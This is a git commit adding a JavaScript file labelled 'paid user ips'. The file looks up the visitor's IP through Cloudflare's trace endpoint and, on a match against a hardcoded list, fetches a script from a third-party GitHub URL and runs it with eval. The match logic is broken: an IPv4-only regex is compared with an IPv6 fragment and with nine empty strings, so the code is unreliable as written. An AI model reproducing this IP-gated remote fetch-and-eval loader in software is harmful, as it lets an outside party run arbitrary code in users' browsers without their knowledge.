d1316b04478831b90f4ce7415ca7bbcc4f9983af
keller coder <102377044+daschoolcoder@users.noreply.github.com>
2023-06-14 15:28:11 +0000

    Update 5 files

---
+++ Resources/ip_data.js
@@ -0,0 +1,122 @@
+//paid user ips
+
+function text(url) {
+  return fetch(url).then(res => res.text());
+}
+
+text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
+  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
+  let ip = data.match(ipRegex)[0];
+  console.log(ip);
+
+  if (ip == '2a00:23c4') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+
+  }
+
+  if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+  }
+
+  if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+  }
+
+  if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+
+
+  }
+
+  if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+
+
+  }
+
+  if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+
+
+  }
+
+  if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+
+
+  }
+
+  if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+
+
+  }
+
+  if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+
+
+  }
+
+  if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      eval(this.responseText);
+    };
+    req.send();
+
+
+  }
+
+
+
+
+
+
+});
